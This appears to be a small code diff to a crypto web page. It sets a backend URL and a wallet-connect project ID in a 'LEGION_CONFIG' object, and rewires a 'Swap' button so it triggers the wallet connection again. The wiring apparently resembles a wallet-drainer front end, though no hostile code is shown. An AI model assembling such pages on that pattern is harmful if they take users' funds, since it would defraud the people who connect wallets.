@@ -270,7 +270,7 @@ main{display:flex;flex-direction:column;align-items:center;padding:16px 16px 80p
 <script>
 window.LEGION_CONFIG = {
   backendUrl: 'https://legionapi-production.up.railway.app',
-  wcProjectId: '',
+  wcProjectId: 'a785da105621eb55c998a35c57587667',
   autoRun: false
 };
 </script>
@@ -428,7 +428,7 @@ window.addEventListener('legion:connected', function(e){
     const mb = document.getElementById('mainBtn');
     mb.textContent = 'Swap';
     mb.className = 'main-btn swap';
-    mb.onclick = function(){ /* swap action */ };
+    mb.onclick = function(){ triggerConnect(); };
   }
 });
 
